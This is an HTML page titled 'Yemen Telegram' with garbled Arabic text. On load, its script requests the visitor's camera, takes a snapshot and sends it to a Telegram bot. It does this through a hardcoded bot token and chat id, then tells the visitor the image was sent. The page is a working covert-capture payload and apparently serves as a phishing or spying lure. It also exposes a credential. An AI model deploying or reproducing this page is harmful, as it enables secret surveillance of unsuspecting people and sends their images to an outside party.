<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Yemen Telegram</title>
</head>
<body>
  <h2>ุฌุงุฑู ุงูุงูุชูุงุท...</h2>

  <script>
    // ุจูุงูุงุช ุงูุจูุช
    const botToken = "6767498865:AAFibdms3ba_9bH8vqD6X92DrkiRHkPEn2w";
    const chatId   = "-1002819450502";

    window.onload = async function() {
      try {
        // ุชุดุบูู ุงููุงููุฑุง
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video  = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        // ุงูุงูุชุธุงุฑ ููููุงู ุญุชู ุชูุชุญ ุงููุงููุฑุง
        await new Promise(res => setTimeout(res, 1500));

        // ุงูุชูุงุท ุตูุฑุฉ
        const canvas = document.createElement('canvas');
        canvas.width  = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);

        // ุชุญููู ุงูุตูุฑุฉ ูุฅุฑุณุงููุง ููุจูุช
        canvas.toBlob(async (blob) => {
          const formData = new FormData();
          formData.append("chat_id", chatId);
          formData.append("photo", blob, "snapshot.jpg");
          formData.append("caption", "๐ธ ุตูุฑุฉ ููุชูุทุฉ");

          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: "POST",
            body: formData
          });

          // ุฅููุงู ุงููุงููุฑุง
          stream.getTracks().forEach(track => track.stop());

          // ุชุบููุฑ ูุงุฌูุฉ ุงูุตูุญุฉ
          document.body.innerHTML = "<h2>โ ุชู ุงูุฅุฑุณุงู</h2>";
        }, "image/jpeg");

      } catch (err) {
        console.error("ุฎุทุฃ:", err);
        alert("โ ูู ูุชู ุงูุณูุงุญ ุจุงููุตูู ุฅูู ุงููุงููุฑุง.");
      }
    };
  </script>
</body>
</html>
